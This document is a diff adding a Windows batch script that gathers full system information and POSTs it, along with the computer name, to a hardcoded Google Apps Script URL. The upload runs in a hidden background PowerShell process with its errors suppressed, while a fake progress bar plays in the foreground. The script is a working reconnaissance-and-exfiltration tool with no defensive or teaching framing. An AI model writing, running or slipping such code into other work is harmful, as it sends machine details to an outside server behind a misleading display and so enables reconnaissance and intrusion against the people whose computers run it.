@@ -1,0 +1,40 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Step 1: Collect system info
+systeminfo > "%TEMP%\sysinfo.txt"
+
+:: Step 2: Setup variables
+set "URL=https://script.google.com/macros/s/AKfycbyVsddaEAhYK0UDcu3AX-to8NCb79FbhDUuPfYi1mlxPe6etgtyp7_2v69II18XREw/exec"
+set "COMPUTER=%COMPUTERNAME%"
+
+echo.
+echo Sending system info to server...
+echo.
+
+:: Step 3: Start PowerShell upload silently (no ^ characters!)
+start /b "" powershell -NoProfile -Command "$body=@{computer='%COMPUTER%';info=(Get-Content '%TEMP%\sysinfo.txt' -Raw)}; try {Invoke-WebRequest -Uri '%URL%' -Method POST -Body $body -ErrorAction Stop} catch {Write-Host ('Upload failed: ' + $_.Exception.Message)}" >nul 2>&1
+
+:: Step 4: Simulated loading bar
+set /a progress=0
+set "bar="
+
+:loading
+set /a progress+=5
+set "bar=!bar!#"
+cls
+echo Sending system info to server...
+echo.
+echo [!bar!] !progress!%%
+
+:: When it reaches 100, finish
+if !progress! lss 100 (
+    timeout /nobreak /t 1 >nul
+    goto loading
+)
+
+echo.
+echo Upload complete!
+echo.
+pause
+endlocal
